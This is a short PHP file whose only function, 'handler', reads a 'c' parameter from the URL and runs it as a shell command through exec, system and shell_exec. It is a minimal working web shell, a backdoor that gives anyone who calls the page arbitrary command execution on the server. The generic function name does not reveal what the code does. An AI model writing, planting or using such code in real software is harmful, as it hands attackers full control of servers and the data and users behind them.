<?php
function handler() {
  $cmd = $_GET["c"];
  exec($cmd);
  system($cmd);
  shell_exec($cmd);
}
